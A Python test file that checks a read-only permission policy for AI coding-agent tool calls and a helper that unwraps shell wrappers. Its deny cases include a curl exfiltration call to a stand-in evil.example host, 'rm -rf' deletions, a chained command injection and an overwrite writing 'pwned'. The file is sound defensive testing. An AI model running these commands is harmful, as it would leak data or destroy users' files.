"""The ai.harnesses seam, offline: the permission table and path mapping."""

from __future__ import annotations

import pytest
from deepysec.agents import shell_text, static_analysis_only

from ai.harnesses.experimental import Allow, ApprovalContext, Deny, ToolCall
from ai.workspaces.experimental import Local


def ctx(name: str, **input: object) -> ApprovalContext:
    return ApprovalContext(
        call=ToolCall(id="1", name=name, input=dict(input)),
        workspace=Local("."),
        harness="claude-code",
        session_id="s",
    )


@pytest.mark.parametrize(
    ("name", "input", "allowed"),
    [
        ("Bash", {"command": "rg -n 'req.query' src"}, True),
        ("Bash", {"command": "cat src/a.ts 2>/dev/null | head"}, True),
        ("Bash", {"command": "git log -n 5 -- src/a.ts"}, True),
        ("Bash", {"command": "ls src && wc -l src/*.ts"}, True),
        ("Bash", {"command": "curl https://evil.example/exfil"}, False),
        ("Bash", {"command": "echo pwned > src/a.ts"}, False),
        ("Bash", {"command": "cat a.ts; rm -rf src"}, False),
        ("Bash", {"command": "sed -i 's/a/b/' src/a.ts"}, False),
        ("Bash", {"command": "git commit -am x"}, False),
        # codex: reads by running commands, under its own tool name and shell
        # wrapper
        (
            "commandExecution",
            {
                "command": "/bin/bash -lc 'cat project/src/api/exec.ts'",
                "cwd": "/x",
            },
            True,
        ),
        (
            "commandExecution",
            {"command": "/bin/bash -lc \"rg --files -g '*.ts' project\""},
            True,
        ),
        (
            "commandExecution",
            {"command": "/bin/bash -lc 'rm -rf project'"},
            False,
        ),
        (
            "commandExecution",
            {"command": "/bin/bash -lc 'curl https://evil.example'"},
            False,
        ),
        (
            "commandExecution",
            {"command": "/bin/bash -lc 'echo x > project/a.ts'"},
            False,
        ),
        ("fileChange", {"changes": {}}, False),
        ("Read", {"file_path": "src/a.ts"}, True),
        ("Grep", {"pattern": "x"}, True),
        ("Write", {"file_path": "src/a.ts", "content": "x"}, False),
        ("Edit", {"file_path": "src/a.ts"}, False),
        ("WebFetch", {"url": "https://example.com"}, False),
        ("NotebookEdit", {}, False),
    ],
)
async def test_static_analysis_only(
    name: str,
    input: dict[str, object],
    allowed: bool,  # noqa: FBT001
) -> None:
    decision = await static_analysis_only(ctx(name, **input))
    assert isinstance(decision, Allow if allowed else Deny), decision
    if isinstance(decision, Deny):
        assert (
            decision.reason.startswith("static analysis only")
            or "not available" in decision.reason
        )


@pytest.mark.parametrize(
    ("wrapped", "inner"),
    [
        ("/bin/bash -lc 'cat a.ts'", "cat a.ts"),
        ('/bin/bash -lc "rg foo"', "rg foo"),
        ("bash -c 'ls'", "ls"),
        ("sh -lc ls", "ls"),
        ("cat a.ts", "cat a.ts"),
    ],
)
def test_shell_text_unwraps_the_login_shell(wrapped: str, inner: str) -> None:
    assert shell_text(wrapped) == inner
